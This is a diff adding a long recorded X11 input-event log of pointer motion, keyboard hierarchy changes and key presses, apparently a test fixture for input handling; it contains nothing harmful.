+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 978.22
+        1: 86.42
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -2.43 (-2.00)
+          1: 6.09 (5.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 978.79/86.51
+    event: 978.79/86.51
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 975.79
+        1: 92.51
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -1.22 (-1.00)
+          1: 4.87 (4.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 975.57/92.38
+    event: 975.57/92.38
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 974.57
+        1: 97.38
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 0.00 (0.00)
+          1: 3.56 (3.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 974.57/97.94
+    event: 974.57/97.94
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        1: 100.94
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -1.16 (-1.00)
+          1: 4.65 (4.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 974.41/100.59
+    event: 974.41/100.59
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 973.41
+        1: 105.59
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -2.34 (-2.00)
+          1: 5.84 (5.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 973.07/105.43
+    event: 973.07/105.43
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 971.07
+        1: 111.43
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -1.18 (-1.00)
+          1: 5.91 (5.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 971.89/111.34
+    event: 971.89/111.34
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 969.89
+        1: 117.34
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -3.60 (-3.00)
+          1: 7.20 (6.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 969.29/117.54
+    event: 969.29/117.54
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 966.29
+        1: 124.54
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -2.43 (-2.00)
+          1: 6.09 (5.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 966.85/124.63
+    event: 966.85/124.63
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 963.85
+        1: 130.63
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -1.21 (-1.00)
+          1: 3.63 (3.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 963.64/130.26
+    event: 963.64/130.26
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 962.64
+        1: 134.26
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -1.20 (-1.00)
+          1: 6.02 (5.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 962.44/134.28
+    event: 962.44/134.28
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 961.44
+        1: 140.28
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -2.43 (-2.00)
+          1: 7.29 (6.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 961.01/140.57
+    event: 961.01/140.57
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 959.01
+        1: 147.57
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -2.46 (-2.00)
+          1: 7.38 (6.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 959.55/147.95
+    event: 959.55/147.95
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 956.55
+        1: 154.95
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -2.49 (-2.00)
+          1: 6.22 (5.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 956.06/154.16
+    event: 956.06/154.16
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 954.06
+        1: 161.16
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -2.50 (-2.00)
+          1: 6.26 (5.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 954.56/161.42
+    event: 954.56/161.42
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 951.56
+        1: 167.42
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -1.26 (-1.00)
+          1: 7.54 (6.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 951.30/167.96
+    event: 951.30/167.96
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 950.30
+        1: 174.96
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -2.53 (-2.00)
+          1: 7.60 (6.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 950.77/174.56
+    event: 950.77/174.56
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 947.77
+        1: 182.56
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -1.28 (-1.00)
+          1: 7.68 (6.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 947.49/182.23
+    event: 947.49/182.23
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 946.49
+        1: 190.23
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -1.30 (-1.00)
+          1: 6.49 (5.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 946.19/190.72
+    event: 946.19/190.72
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 945.19
+        1: 196.72
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -1.31 (-1.00)
+          1: 6.56 (5.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 945.88/196.29
+    event: 945.88/196.29
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 943.88
+        1: 203.29
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -1.28 (-1.00)
+          1: 3.85 (3.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 943.60/203.14
+    event: 943.60/203.14
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 942.60
+        1: 207.14
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -1.24 (-1.00)
+          1: 3.73 (3.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 942.35/207.86
+    event: 942.35/207.86
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 941.35
+        1: 210.86
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 0.00 (0.00)
+          1: 1.21 (1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 941.35/210.07
+    event: 941.35/210.07
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        1: 212.07
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 0.00 (0.00)
+          1: 4.72 (4.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 941.35/212.79
+    event: 941.35/212.79
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        1: 216.79
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -2.35 (-2.00)
+          1: 3.52 (3.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 941.01/216.31
+    event: 941.01/216.31
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 939.01
+        1: 220.31
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -3.53 (-3.00)
+          1: 5.89 (5.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 939.47/220.20
+    event: 939.47/220.20
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 935.47
+        1: 226.20
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -1.16 (-1.00)
+          1: 1.16 (1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 935.32/226.36
+    event: 935.32/226.36
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 934.32
+        1: 227.36
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -1.12 (-1.00)
+          1: 2.24 (2.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 934.20/227.59
+    event: 934.20/227.59
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 933.20
+        1: 229.59
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -1.08 (-1.00)
+          1: 1.08 (1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 933.11/229.68
+    event: 933.11/229.68
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 932.11
+        1: 230.68
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 0.00 (0.00)
+          1: 2.05 (2.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 932.11/230.73
+    event: 932.11/230.73
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        1: 232.73
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 12 (PropertyEvent)
+     property: 155 'Device Enabled'
+     changed: modified
+EVENT type 11 (HierarchyChanged)
+    Changes happened:        [device disabled]
+    device 2 [master pointer (3)] is enabled
+    device 3 [master keyboard (2)] is enabled
+    device 4 [slave pointer (2)] is enabled
+    device 5 [slave keyboard (3)] is enabled
+    device 6 [slave keyboard (3)] is enabled
+    device 7 [slave keyboard (3)] is enabled
+    device 8 [slave keyboard (3)] is enabled
+    device 9 [slave keyboard (3)] is enabled
+    device 10 [slave pointer (2)] is enabled
+    device 11 [slave keyboard (3)] is enabled
+    device 12 [slave pointer (2)] is enabled
+    device 13 [slave pointer (2)] is enabled
+    device 14 [slave keyboard (3)] is enabled
+    device 15 [slave keyboard (3)] is enabled
+    device 16 [slave keyboard (3)] is enabled
+    device 17 [slave keyboard (3)] is enabled
+    device 18 [slave keyboard (3)] is disabled
+    changes:        [device disabled]
+EVENT type 12 (PropertyEvent)
+     property: 278 'Device Product ID'
+     changed: deleted
+EVENT type 12 (PropertyEvent)
+     property: 277 'Device Node'
+     changed: deleted
+EVENT type 12 (PropertyEvent)
+     property: 276 'libinput Send Events Mode Enabled Default'
+     changed: deleted
+EVENT type 12 (PropertyEvent)
+     property: 275 'libinput Send Events Mode Enabled'
+     changed: deleted
+EVENT type 12 (PropertyEvent)
+     property: 274 'libinput Send Events Modes Available'
+     changed: deleted
+EVENT type 12 (PropertyEvent)
+     property: 157 'Coordinate Transformation Matrix'
+     changed: deleted
+EVENT type 12 (PropertyEvent)
+     property: 155 'Device Enabled'
+     changed: deleted
+EVENT type 11 (HierarchyChanged)
+    Changes happened:    [slave removed]
+    device 2 [master pointer (3)] is enabled
+    device 3 [master keyboard (2)] is enabled
+    device 4 [slave pointer (2)] is enabled
+    device 5 [slave keyboard (3)] is enabled
+    device 6 [slave keyboard (3)] is enabled
+    device 7 [slave keyboard (3)] is enabled
+    device 8 [slave keyboard (3)] is enabled
+    device 9 [slave keyboard (3)] is enabled
+    device 10 [slave pointer (2)] is enabled
+    device 11 [slave keyboard (3)] is enabled
+    device 12 [slave pointer (2)] is enabled
+    device 13 [slave pointer (2)] is enabled
+    device 14 [slave keyboard (3)] is enabled
+    device 15 [slave keyboard (3)] is enabled
+    device 16 [slave keyboard (3)] is enabled
+    device 17 [slave keyboard (3)] is enabled
+    device 18 [<undefined> (0)] is disabled
+    changes:    [slave removed]
+EVENT type 11 (HierarchyChanged)
+    Changes happened:   [new slave]
+    device 2 [master pointer (3)] is enabled
+    device 3 [master keyboard (2)] is enabled
+    device 4 [slave pointer (2)] is enabled
+    device 5 [slave keyboard (3)] is enabled
+    device 6 [slave keyboard (3)] is enabled
+    device 7 [slave keyboard (3)] is enabled
+    device 8 [slave keyboard (3)] is enabled
+    device 9 [slave keyboard (3)] is enabled
+    device 10 [slave pointer (2)] is enabled
+    device 11 [slave keyboard (3)] is enabled
+    device 12 [slave pointer (2)] is enabled
+    device 13 [slave pointer (2)] is enabled
+    device 14 [slave keyboard (3)] is enabled
+    device 15 [slave keyboard (3)] is enabled
+    device 16 [slave keyboard (3)] is enabled
+    device 17 [slave keyboard (3)] is enabled
+    device 18 [floating slave (0)] is disabled
+    changes:   [new slave]
+EVENT type 12 (PropertyEvent)
+     property: 155 'Device Enabled'
+     changed: modified
+EVENT type 11 (HierarchyChanged)
+    Changes happened:       [device enabled]
+    device 2 [master pointer (3)] is enabled
+    device 3 [master keyboard (2)] is enabled
+    device 4 [slave pointer (2)] is enabled
+    device 5 [slave keyboard (3)] is enabled
+    device 6 [slave keyboard (3)] is enabled
+    device 7 [slave keyboard (3)] is enabled
+    device 8 [slave keyboard (3)] is enabled
+    device 9 [slave keyboard (3)] is enabled
+    device 10 [slave pointer (2)] is enabled
+    device 11 [slave keyboard (3)] is enabled
+    device 12 [slave pointer (2)] is enabled
+    device 13 [slave pointer (2)] is enabled
+    device 14 [slave keyboard (3)] is enabled
+    device 15 [slave keyboard (3)] is enabled
+    device 16 [slave keyboard (3)] is enabled
+    device 17 [slave keyboard (3)] is enabled
+    device 18 [slave keyboard (3)] is enabled
+    changes:       [device enabled]
+EVENT type 1 (DeviceChanged)
+    device: 3 (18)
+    reason: SlaveSwitch
+        Reporting 1 classes:
+                Class originated from: 18. Type: XIKeyClass
+                Keycodes supported: 248
+
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 37
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 37
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 64
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 64
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0x4 effective: 0x4
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 28
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 28
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0xc effective: 0xc
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 9 (FocusIn)
+    device: 3 (3)
+    windows: root 0x1e5 event 0x1e5 child 0x0
+    mode: NotifyGrab (detail NotifyInferior)
+    flags:  [same screen]
+    buttons:
+    modifiers: locked 0 latched 0 base 0xc effective: 0xc
+    group: locked 0 latched 0 base 0 effective: 0
+    root x/y:  932.00 / 232.00
+    event x/y: 932.00 / 232.00
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 28
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0xc effective: 0xc
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 37
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0xc effective: 0xc
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 64
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0x8 effective: 0x8
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 28
+    valuators:
+
+EVENT type 10 (FocusOut)
+    device: 3 (3)
+    windows: root 0x1e5 event 0x1e5 child 0x0
+    mode: NotifyUngrab (detail NotifyInferior)
+    flags:  [same screen]
+    buttons:
+    modifiers: locked 0 latched 0 base 0xc effective: 0xc
+    group: locked 0 latched 0 base 0 effective: 0
+    root x/y:  932.00 / 232.00
+    event x/y: 932.00 / 232.00
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 37
+    valuators:
+
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 64
+    valuators:
+
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 53
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 53
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 53
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 53
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 31
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 31
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 31
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 31
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 57
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 57
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 57
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 57
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 33
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 33
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 33
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 33
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 30
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 30
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 30
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 30
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 28
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 28
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 28
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 28
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 65
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 65
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 65
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 65
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 28
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 28
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 28
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 28
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8007e0
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 26
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 26
+    flags:
+    root: 932.00/232.00
+    event: 932.00/232.00
+    buttons:
